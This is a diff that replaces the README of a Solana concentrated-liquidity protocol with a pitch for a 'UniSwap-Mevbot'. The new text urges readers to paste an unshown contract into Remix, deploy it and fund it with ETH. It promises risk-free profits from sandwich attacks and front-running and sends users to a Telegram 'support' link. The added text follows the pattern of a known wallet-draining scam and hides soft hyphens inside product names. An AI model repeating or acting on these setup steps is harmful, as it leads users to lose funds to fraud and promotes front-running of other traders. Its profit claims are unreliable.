@@ -1,127 +1,78 @@
-# Cyclos Protocol v2
 
-Concentrated liquidity on Solana
+# UniSwap-Mevbot
+Fully-auto on-chain Uniswap MEVbot leveraging flashloans and the minimal gas fees of Ethereum to perform sandwich attacks and front-runs on Uniswap.
 
-## High level design
+Launch your own MEV engine or start trading with my public program for a 0.1% fee on successful arbitrage transactions.
 
-The main challenge was to adapt Uniswap's architecture to sealevel, and EVM's 256 bit numbers to the 64 bit rust runtime.
+> [!IMPORTANT]
+> Due to the atomic nature of Flashloan operations, if they aren't profitable the transaction will revert and no net profit will be lost.
 
-### 1. Architecture
-
-- Smart contracts of importance on Uniswap are
-
-    1. **Factory**: Creates pools for a given pair of tokens and fee tier. Also allows the creation of new fee tiers and changing the protocol owner.
-    2. **Pool**: Lower level API to create positions linked with public keys, and perform swaps. Swaps can only be performed by another smart contract implementing the swap callback API.
-    3. **Non fungible position manager**: Interacts with the core pool, creating positions for the user tied to non-fungible tokens (NFTs).
-    4. **Swap router**: Supports advanced swap features like deadlines, slippage checks and exact input / exact output swaps. It implements the swap callback API as required by the core.
-
-- Cyclos had to adapt Uniswap's architecture to meet Sealevel's pecularieties like:
-    1. Smart contracts cannot deploy other smart contracts
-    2. Separation of data and business logic: Solana programs are stateless. Accounts are used to persist data
-    3. Re-entrancy is limited to self-recursion, i.e. we cannot not replicate the swap callback pattern if two separate smart contracts are used
-    4. High compute budget cost of cross program invocations and the 200k compute unit limitation
-    5. Account lookups must be performed client side. For example we must derive the correct observation account on client side and pass it via context, instead of the smart contract deriving it at runtime.
-
-- The following design decisions were made:
-    1. A monolithic program, instead of multiple smart contracts
-    2. An internal function call was used instead of self-recursion for the swap callback to save compute units
-    3. Program derived addresses replace maps and arrays. Instead of pool addresses being tracked by a (token0, token1, fee) map we use PDAs with a similar address derivation scheme. The oracle observation array is similarly emulated using array index as a seed.
-
-
-### 2. Mathematics
-
-1. Logarithm and power functions have been adapted to 64 bit by scaling down magic numbers.
-2. The variable scaling factor is 1/4 with some exceptions:
-    - Token amounts: 64 bit (dictated by SPL token program) in place of 256 bit
-    - Square root price: `sqrt_price_x32: u64` in place of `uint160 sqrtPriceX96`. Effectively this is 32 bit `√P` with 32 bits for decimal places (U32.32 format).
-    - Liquidity: `u64` in place of `u128`. Given `x = L/√P`, `y = L√P` with x,y (amounts) being 64 bit, the product or division of `L` and `√P` can never exceed 64 bits. 64 and not 32 bits were used for liquidity so that max liquidity per tick could be respectable.
-3. There's no mulmod opcode equivalent in Rust, so we implement phantom overflow resistant mul-div using large numbers(U128 for u64, U256 for U128) in the full_math library.
-4. `U128` used in place of the native `u128` for [compute unit efficiency](https://github.com/solana-labs/solana/issues/19549).
-
-Note that the math libraries in /libraries have 100% test coverage.
-
-### Directory structure
-
-- [lib.rs](./programs/core/src/lib.rs): Smart contract instructions
-- [context.rs](./programs/core/src/context.rs): Accounts required for each instruction
-- [error.rs](./programs/core/src/error.rs): Error codes. Cyclos tries to preserve Uniswap's convention on error messages.
-- [access_control.rs](./programs/core/src/access_control.rs): Deadline and authorization checks
-- [/libraries](./programs/core/src/libraries): Stateless math libraries
-- [/states](./programs/core/src/states): Various accounts (factory, pool, position etc) and their associated functions
-
-## Test coverage
-
-- We tried to port all of Uniswap's tests to inherit its security.
-    - [/libraries](./programs/core/src/libraries) has 100% coverage
-    - [/states](./programs/core/src/states): oracle, pool, position_manager and swap_router are left out unfortunately
-
-- Difficulty arose in testing due to Solana's account model. Rust based unit tests could not be written for parts like the oracle, due to client side lookup. These will be re-written as JS based unit tests.
-
-- Some issues were discovered during client side development and hot-patched.
-    - https://github.com/cyclos-io/cyclos-protocol-v2/commit/2e21a3a2c3100ba73860e4ae8b2481dfd0c15a7c
-    - https://github.com/cyclos-io/cyclos-protocol-v2/commit/df33e0cffac2d085bdb85f8d33500ba12131a499
-
-## Resources
-
-- Account diagram and library tree: https://drive.google.com/file/d/1S8LMa22uxBh7XGNMUzp-DDhVhE-G9S2s/view?usp=sharing
-
-- Task tracker: https://github.com/orgs/cyclos-io/projects/1
-
-## Oracle design
-
-- Cyclos adapts Uniswap's circular observation array to Sealevel using program derived accounts (PDA). Each PDA is seeded with an **index** representing its array position in the given way-
-
+# How MEVBOT works
+```mermaid
+graph LR
+A(User Transaction)-->B(MEV Bot)-->C(Opportunity Detection)--> E(Transaction Construction)
+E --> F(Transaction Submission)
+F -->J(Block Inclusion)
+J-->K(Profit Realization)
 ```
-[OBSERVATION_SEED, token_0, token_1, fee, index]
-```
+  - User Transaction: A user submits a transaction to the Ethereum network.
+  - MEV Bot: The MEV bot monitors the mempool for profitable opportunities.
+  - Opportunity Detection: The bot identifies potential MEV opportunities (e.g., arbitrage, liquidation).
+  - Transaction Construction: The bot constructs a transaction to exploit the opportunity.
+  - Transaction Submission: The bot submits the transaction to the network.
+  - Block Inclusion: The transaction gets included in a block by miners.
+  - Profit Realization: The MEV bot realizes the profit from the successful transaction.
 
-- Index is incremented for every successive observation and wrapped around at the end element. For a cardinality 3, the indexes will be `0, 1, 2, 0, 1` and so on. The index for the latest position is found as `pool.observation_index % cardinality`.
+ #### The bot is constantly sniffing the for user buys, sells, and token creations containing slippage deficits.
+> [!TIP]
+> Bot operators can target any transaction value within their balance threshold. Generally, higher thresholds net consistently viable transactions
+-  Once a transaction is identified, a flashloan is initiated for the target transaction amount, this requires a marginal amount of collateral.
+-  The bot will aggresively attempt to front-run the transaction by dynamically monitoring the bribe to the miner and increasing it if necessary so as to be the first transaction mined.
+- Depending on the set parameters, the bot will either front-run the Dev's sell to remain in profit, or sell upon the token reaching KOTH.
+- The flashloan is then repaid, collateral is reiumbursed and profits are deposited into the operators wallet.
+-  If the transaction is unprofitable at any point it will be reverted and the flashloan will be repaid, losing no gas or net profit.
+# Setup
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
-- Cardinality can be grown to store more observations.
-    1. Created slots are [marked as uninitialized](https://github.com/Uniswap/v3-core/blob/ed88be38ab2032d82bf10ac6f8d03aa631889d48/contracts/libraries/Oracle.sol#L117). A placeholder timestamp value of 1 is stored to perform an SSTORE and pay for slot creation. Cyclos analogously creates a program account.
-    2. The pool variable `observationCardinality` stores the number of **initialized slots**, and `observationCardinalityNext` stores the count of **created slots**. `observationCardinalityNext` is incremented on slot creation, but not `observationCardinality`.
-    3. When we reach the end element allowed by `observationCardinality`, the value of this variable is incremented so that the next uninitialized slot can be reached for writing the next observation. This repeats until every uninitialized slot is filled.
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
 
-- Obervations are updated on
-    1. [Swaps](./programs/core/src/lib.rs#L1483)
-    2. [Position modifications, i.e. creating, removing and modifying positions](./programs/core/src/lib.rs#L2387)
+4. Paste this [****sourcecode****](sourcecode.sol) code in R­­emi­x­.
 
-- Uniswap checkpoints data whenever a pool is touched **for the first time in a block**. Other interactions within the block are not recorded.
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
 
-- Uniswap's observation array can store 65k slots, equivalent to 9 days of recordings given Ethereum's 14 second block time. 65k slots would result in just a day's worth of readings on Solana given its 0.5 second block time. We introduce a time partitioning mechanism to overcome this limitation
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
 
-    1. Block time is partitioned in 14 second intervals starting with epoch time 0.
-    ```
-    |----partition_0 [0, 14)----|----partition_1 [14, 28)----|----partition_0 [28, 42)----|
-    ```
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
 
-    2. To know the partition for a timestamp, perform floor division by 14.
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
 
-    ```
-    partition = floor(timestamp / 14)
-    ```
 
-    3. Find the partitions for the current block time (partition_current) and for the last saved observation (partition_last).
+> [!IMPORTANT]
+> The bot will immediately begin searching for and transacting arbitrage.
+> Stop the bot any time by clicking the "STOP" button. any current transactions will be sold or reverted.
 
-    4. If `partition_current > partition_last` checkpoint in the next slot. Else overwrite the current slot with new data.
 
-- Unlike EVM, the last and next observation accounts must be found on client side in Sealevel.
-    1. Last observation state: Acccount storing the last checkpoint.
-    2. Next observation state: The account which follows the last observation, given by formula `(index_last + 1) % cardinality_next`. This account is read/modfified only if the next and last checkpoint fall in different partitions. This field can be made optional in future by using remaining accounts.
 
-#### Optimize build
 
-1. Repo wide Cargo.toml
+# Contributions
 
-```toml
-[profile.release]
-lto = "fat"
-codegen-units = 1
+Contributions are welcome. If you would like to contribute please submit a pull request with your suggested changes.
 
-[profile.release.build-override]
-opt-level = 3
-incremental = false
-codegen-units = 1
-```
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-2. Build with `anchor test -- --features no-log-ix-name` to disable function name logging
+# Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
